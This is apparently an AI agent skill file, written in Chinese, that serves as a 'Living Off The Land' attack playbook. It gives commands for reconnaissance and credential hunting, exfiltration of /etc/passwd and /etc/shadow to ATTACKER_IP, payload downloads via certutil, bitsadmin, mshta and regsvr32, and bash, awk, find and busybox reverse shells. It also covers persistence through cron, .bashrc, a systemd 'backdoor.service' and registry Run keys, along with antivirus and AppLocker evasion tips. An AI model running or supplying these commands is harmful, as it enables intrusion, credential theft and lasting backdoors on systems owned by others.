---
name: 'living-off-the-land'
description: 'Living Off The Land：不用上传工具，用系统自带二进制完成侦察/传输/执行/持久化。Linux /dev/tcp 纯 bash + Windows certutil/bitsadmin/mshta'
disable-model-invocation: true
metadata: { domain: linux, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Living Off The Land (LOTL)

> 不用上传任何工具，只用目标系统自带的二进制完成侦察、传输、执行、持久化

## 侦察 (Recon)

### 系统信息
```bash
# Linux
uname -a; cat /etc/os-release; hostname; id; env
cat /proc/1/cgroup | grep docker  # 在容器里？
df -h; mount; lsblk
ps aux; ss -ntlp; ip a; route -n

# Windows
systeminfo; ver; hostname; whoami /all; set
tasklist /v; netstat -ano; ipconfig /all; route print
qwinsta  # 谁登录了 (RDP sessions)
net user; net localgroup; net group /domain
```

### 文件/凭据搜索
```bash
# Linux
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'
grep -r "password\|secret\|key" /etc/ /opt/ /var/ 2>/dev/null | head -20
cat ~/.bash_history; cat /var/log/auth.log | grep -i pass
find / -name "*.env" -o -name "*.conf" -o -name "*.ini" 2>/dev/null | head -20

# Windows
dir /s C:\*.xml C:\*.ini C:\*.config C:\*.conf > find.txt
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
type %USERPROFILE%\AppData\Local\.bash_history 2>nul
```

### 网络侦察
```bash
# Linux (纯 bash — 无 nc/curl)
exec 3<>/dev/tcp/10.0.0.1/80 && echo -e "GET / HTTP/1.0\r\n" >&3 && cat <&3  # HTTP GET
timeout 2 bash -c 'echo >/dev/tcp/10.0.0.1/445 && echo OPEN || echo CLOSED' 2>/dev/null  # 端口扫描

# Windows
net view; net view /domain; netstat -ano | findstr ESTABLISHED
nslookup DOMAIN_CONTROLLER; ping -n 1 HOST
```

## 文件传输 (File Transfer)

### 出站 (窃取文件 → 攻击机)
```bash
# === 纯 bash /dev/tcp (无 nc/curl/wget 时) ===
# 攻击机: nc -lvnp 8080 > stolen.txt
exec 3<>/dev/tcp/ATTACKER_IP/8080; cat /etc/passwd >&3; exec 3>&-

# === curl POST ===
curl -X POST -d @/etc/shadow http://ATTACKER_IP:8080/

# === certutil (Windows — 转 Base64 后手工复制) ===
certutil -encode stolen.txt tmp.b64 && type tmp.b64
# 攻击机: echo '<paste>' | base64 -d > stolen.txt

# === certutil 直接上传 (Windows) ===
certutil -urlcache -split -f http://ATTACKER_IP:8080/tool.exe C:\Windows\Temp\t.exe
```

### 入站 (下载工具 → 受害机)
```bash
# === Linux 无 curl/wget ===
# 纯 bash:
exec 3<>/dev/tcp/ATTACKER_IP/8080; echo -e "GET /tool HTTP/1.0\r\nHost: ATTACKER_IP\r\n\r\n" >&3; cat <&3 > /tmp/tool

# === Windows certutil (最稳定) ===
certutil -urlcache -split -f http://ATTACKER_IP:8080/nc.exe C:\Windows\Temp\n.exe

# === Windows PowerShell ===
iwr -Uri http://ATTACKER_IP:8080/tool.exe -OutFile C:\Windows\Temp\t.exe
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8080/tool.exe','C:\Windows\Temp\t.exe')

# === Windows bitsadmin (不触发 Defender) ===
bitsadmin /transfer job /download /priority high http://ATTACKER_IP:8080/tool.exe C:\Windows\Temp\t.exe

# === Windows mshta (远程 VBS/JS) ===
mshta http://ATTACKER_IP:8080/payload.hta
```

## 执行 (Code Execution)

### 无 python/perl/ruby 时
```bash
# === bash 内置 (不依赖 /usr/bin/python) ===
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# === awk (通常预装) ===
awk 'BEGIN {system("/bin/bash -c '\''bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\''")}'

# === find (无需 awk) ===
find /etc -name passwd -exec /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' \;

# === busybox (嵌入式系统) ===
busybox nc ATTACKER_IP 4444 -e /bin/sh
```

### Windows 无 powershell.exe (被 AppLocker 拦)
```bash
# === certutil + base64 解码 exe ===
# 1. 把 exe 切成 base64 块 → certutil -decode piece.b64 piece.exe
# 2. 或用 PowerShell 绕过执行策略:
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -enc <BASE64_ENCODED_COMMAND>

# === regsvr32 (运行 COM scriptlet) ===
regsvr32 /s /n /u /i:http://ATTACKER_IP:8080/payload.sct scrobj.dll

# === rundll32 ===
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd /c whoami");

# === mshta (内联 VBScript) ===
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c whoami"":close")

# === wmic ===
wmic process call create "cmd.exe /c whoami"
```

## 持久化 (Persistence)

### Linux
```bash
# === cron (最稳定) ===
echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' | crontab -

# === .bashrc hook ===
echo 'nohup bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" &>/dev/null &' >> ~/.bashrc

# === SSH key (需 ~/.ssh 可写) ===
echo 'ssh-rsa AAA...' >> ~/.ssh/authorized_keys

# === systemd user unit ===
mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/backdoor.service << 'EOF'
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
Restart=always
[Install]
WantedBy=default.target
EOF
systemctl --user enable --now backdoor.service
```

### Windows
```bash
# === 注册表 Run Key ===
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# === 计划任务 ===
schtasks /create /sc minute /mo 10 /tn "SecurityUpdate" /tr "cmd.exe /c whoami" /f

# === WMI 事件订阅 (无文件落地) ===
wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE ...
```

## 交互 Shell 升级

```bash
# === 拿到 dumb shell 后第一件事 ===
python3 -c 'import pty; pty.spawn("/bin/bash")'        # 首选
python -c 'import pty; pty.spawn("/bin/bash")'         # Python 2
script -qc /bin/bash /dev/null                          # 无 Python 时
busybox sh                                              # 嵌入式

# === Ctrl-Z 暂停 → 攻击机执行 ===
stty raw -echo; fg; reset
export TERM=xterm-256color
exec /bin/bash -i
```

## 快速记忆口诀

```
侦察: id, sudo -l, ps aux, ss -ntlp, env, find writable
传输: certutil (Win), /dev/tcp (Linux), base64 (通用)
执行: bash -i >& /dev/tcp, awk system(), find -exec, mshta (Win)
升级: python3 pty.spawn
持久: crontab, .bashrc, registry Run
```
